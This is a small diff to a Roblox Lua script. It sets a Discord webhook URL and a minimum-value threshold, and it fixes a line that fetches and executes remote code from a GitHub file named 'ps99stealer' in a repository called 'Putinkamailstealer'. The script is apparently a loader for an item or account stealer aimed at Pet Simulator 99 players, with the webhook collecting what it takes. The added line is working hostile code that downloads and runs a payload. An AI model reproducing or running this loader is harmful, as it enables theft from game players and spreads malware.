@@ -3,4 +3,4 @@ Webhook= 'https://discord.com/api/webhooks/1283230603285626952/2Jb3GlifuiB-xCULK
  
 MinimumRAP = 500000
  
-loadstring(juego:HttpGet("https://raw.githubusercontent.com/IanWP411/Putinkamailstealer/main/ps99stealer",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IanWP411/Putinkamailstealer/main/ps99stealer",true))()
